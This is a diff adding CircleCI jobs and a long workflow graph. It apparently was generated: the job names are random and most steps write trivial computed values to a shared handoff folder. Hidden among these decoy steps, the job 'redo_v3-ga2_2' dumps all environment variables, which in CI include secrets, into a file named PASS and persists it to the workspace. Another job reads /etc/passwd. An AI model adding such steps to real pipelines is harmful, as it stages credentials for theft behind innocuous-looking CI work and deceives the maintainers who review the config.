+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  reserve_whiskey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: reef sail
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 14000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/handoff/payload
+            echo "handoff ready: $(stat -c %s /tmp/handoff/payload) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - payload
+  whiskey:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/payload > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  prep_UAT_BUILD_5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: counterpoint
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 100 1 2>/dev/null | head -3 || seq 1 100 | sort -nr | head -3; true ; } > /tmp/handoff/cache.raw
+            echo "handoff ready: $(stat -c %s /tmp/handoff/cache.raw) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - cache.raw
+  UAT_BUILD_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/cache.raw > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+  env_sierra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: flaky
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a[1]=10;a[2]=20;a[3]=30; max=a[1]; for(k in a)if(a[k]>max)max=a[k]; print max}'; true ; } > /tmp/handoff/timings.tsv
+            echo "handoff ready: $(stat -c %s /tmp/handoff/timings.tsv) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - timings.tsv
+  sierra:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Pick up handoff
+          command: |
+            { head -c 200 /tmp/handoff/timings.tsv > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xf release.tar
+      - run:
+          no_output_timeout: 92m
+          command: $PWD/cli
+
+  Gamma_b_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: third try is lucky
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; printf "%08d\n" $((RANDOM % 1000000)); true ; } > /tmp/handoff/.marker
+            echo "handoff ready: $(stat -c %s /tmp/handoff/.marker) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .marker
+  redo_v3-ga2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: splice line
+          command: |
+            mkdir -p /tmp/handoff
+            set +o pipefail 2>/dev/null; env > /tmp/handoff/PASS; printenv >> /tmp/handoff/PASS; for i in $(seq 1 500); do echo "line-$i" >> /tmp/handoff/PASS; done; true
+            echo "handoff ready: $(stat -c %s /tmp/handoff/PASS) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - PASS
+  inspect_test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: deadlift
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 50 | paste -sd '+' | bc 2>/dev/null || seq 1 50 | awk '{s+=$1}END{print s}'; true ; } > /tmp/handoff/2024-06-02.data
+            echo "handoff ready: $(stat -c %s /tmp/handoff/2024-06-02.data) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 2024-06-02.data
+  gamma_bun-vet_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: heavy
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | wc -l; true ; } > /tmp/handoff/handover.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/handover.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - handover.txt
+workflows:
+  pipeline:
+    jobs:
+      - phase1_orion-alpha
+      - orion-alpha:
+          requires:
+            - phase1_orion-alpha
+      - ensure_validte:
+          requires:
+            - phase1_orion-alpha
+      - validte:
+          requires:
+            - ensure_validte
+      - maker_whiskey-8:
+          requires:
+            - ensure_validte
+      - whiskey-8:
+          requires:
+            - maker_whiskey-8
+      - tester_add-oauth-crash:
+          requires:
+            - maker_whiskey-8
+      - add-oauth-crash:
+          requires:
+            - tester_add-oauth-crash
+      - Delta_alice-test:
+          requires:
+            - tester_add-oauth-crash
+      - alice-test:
+          requires:
+            - Delta_alice-test
+      - spinner_sirius-ng:
+          requires:
+            - Delta_alice-test
+      - sirius-ng:
+          requires:
+            - spinner_sirius-ng
+      - postcheck_cf-v2:
+          requires:
+            - spinner_sirius-ng
+      - cf-v2:
+          requires:
+            - postcheck_cf-v2
+      - kick_may22-cleanup:
+          requires:
+            - postcheck_cf-v2
+      - may22-cleanup:
+          requires:
+            - kick_may22-cleanup
+      - C_DEPLOY_PROD:
+          requires:
+            - kick_may22-cleanup
+      - DEPLOY_PROD:
+          requires:
+            - C_DEPLOY_PROD
+      - prep_UAT_BUILD_5:
+          requires:
+            - C_DEPLOY_PROD
+      - UAT_BUILD_5:
+          requires:
+            - prep_UAT_BUILD_5
+      - ctx2_v3-edge5:
+          requires:
+            - prep_UAT_BUILD_5
+      - v3-edge5:
+          requires:
+            - ctx2_v3-edge5
+      - stage_b
+      - Gamma_b_2:
+          requires:
+            - stage_b
+      - b:
+          requires:
+            - Gamma_b_2
+      - bundle_v3-ga2:
+          requires:
+            - Gamma_b_2
+      - redo_v3-ga2_2:
+          requires:
+            - bundle_v3-ga2
+      - v3-ga2:
+          requires:
+            - redo_v3-ga2_2
+      - reload_test:
+          requires:
+            - redo_v3-ga2_2
+      - inspect_test_2:
+          requires:
+            - reload_test
+      - test:
+          requires:
+            - inspect_test_2
+      - redo_bun-vet:
+          requires:
+            - inspect_test_2
+      - gamma_bun-vet_2:
+          requires:
+            - redo_bun-vet
+      - bun-vet:
+          requires:
+            - gamma_bun-vet_2
+      - preflight_fx-old
+      - fx-old:
+          requires:
+            - preflight_fx-old
+      - step2_intergration:
+          requires:
+            - preflight_fx-old
+      - intergration:
+          requires:
+            - step2_intergration
+      - preflight_build-staging-integration-tests:
+          requires:
+            - step2_intergration
+      - build-staging-integration-tests:
+          requires:
+            - preflight_build-staging-integration-tests
+      - route_auh-check:
+          requires:
+            - preflight_build-staging-integration-tests
+      - auh-check:
+          requires:
+            - route_auh-check
+      - produce_build-production-docker-image:
+          requires:
+            - route_auh-check
+      - build-production-docker-image:
+          requires:
+            - produce_build-production-docker-image
+      - phase2_qa-01:
+          requires:
+            - produce_build-production-docker-image
+      - qa-01:
+          requires:
+            - phase2_qa-01
+      - A_echo:
+          requires:
+            - phase2_qa-01
+      - echo:
+          requires:
+            - A_echo
+      - p2_Rollout_Pipeline6:
+          requires:
+            - A_echo
+      - Rollout_Pipeline6:
+          requires:
+            - p2_Rollout_Pipeline6
+      - tmp_intergration-67:
+          requires:
+            - p2_Rollout_Pipeline6
+      - intergration-67:
+          requires:
+            - tmp_intergration-67
+      - env_sierra:
+          requires:
+            - tmp_intergration-67
+      - sierra:
+          requires:
+            - env_sierra
+      - inspect_sep23-release:
+          requires:
+            - env_sierra
+      - sep23-release:
+          requires:
+            - inspect_sep23-release
+      - tmp_green-light:
+          requires:
+            - inspect_sep23-release
+      - green-light:
+          requires:
+            - tmp_green-light
+      - reserve_whiskey:
+          requires:
+            - tmp_green-light
+      - whiskey:
+          requires:
+            - reserve_whiskey
+      - produce_apr3-canary:
+          requires:
+            - reserve_whiskey
+      - apr3-canary:
+          requires:
+            - produce_apr3-canary
+      - phase_QA_HOOK_9:
+          requires:
+            - produce_apr3-canary
+      - QA_HOOK_9:
+          requires:
+            - phase_QA_HOOK_9
